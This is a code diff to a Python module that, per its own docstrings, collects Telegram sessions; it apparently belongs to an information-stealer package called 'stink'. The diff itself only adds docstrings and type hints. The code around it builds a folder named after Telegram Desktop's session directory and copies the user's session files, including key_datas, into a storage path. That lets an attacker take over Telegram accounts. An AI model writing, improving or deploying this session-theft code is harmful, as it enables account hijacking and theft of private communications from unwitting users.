@@ -6,7 +6,9 @@ from stink.helpers.config import TelegramConfig
 
 
 class Telegram:
-
+    """
+    Collects sessions from the Telegram.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
@@ -15,15 +17,21 @@ class Telegram:
 
         self.__config = TelegramConfig()
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the Telegram module.
+        :return: None
+        """
         folder = rf"{self.__storage_path}\{self.__folder}\D877F783D5D3EF8C"
 
         if not path.exists(folder):
             makedirs(folder)
 
-    def __get_sessions(self):
-
+    def __get_sessions(self) -> None:
+        """
+        Collects sessions from the Telegram.
+        :return: None
+        """
         if not path.exists(self.__config.SessionsPath):
             return
 
@@ -47,8 +55,11 @@ class Telegram:
 
         copyfile(rf"{self.__config.SessionsPath}\key_datas", rf"{folder}\key_datas")
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the Telegram collection module.
+        :return: None
+        """
         try:
 
             self.__get_sessions()
